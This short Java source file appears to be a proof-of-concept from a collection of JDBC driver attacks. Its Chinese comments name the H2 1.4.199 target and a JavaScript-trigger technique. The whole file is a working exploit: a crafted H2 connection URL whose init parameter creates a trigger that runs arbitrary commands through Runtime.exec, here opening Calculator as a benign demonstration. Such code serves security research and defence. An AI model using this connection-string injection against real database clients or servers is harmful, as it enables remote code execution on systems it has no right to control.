package org.su18.jdbc.attack.h2;

import java.sql.Connection;
import java.sql.DriverManager;

/**
 * 依赖版本 1.4.199
 * 驱动名称 org.h2.Driver
 * 攻击方式 JavaScript Source Code Compile
 * 无需任何依赖
 *
 * @author su18
 */
public class AttackH2ByJavaScript {

	public static void main(String[] args) throws Exception {
		// 装载驱动
		Class.forName("org.h2.Driver");

		String javascript = "//javascript\njava.lang.Runtime.getRuntime().exec(\"open -a Calculator.app\")";
		String url        = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER hhhh BEFORE SELECT ON INFORMATION_SCHEMA.CATALOGS AS '" + javascript + "'";

		Connection conn = DriverManager.getConnection(url);
		conn.close();
	}

}
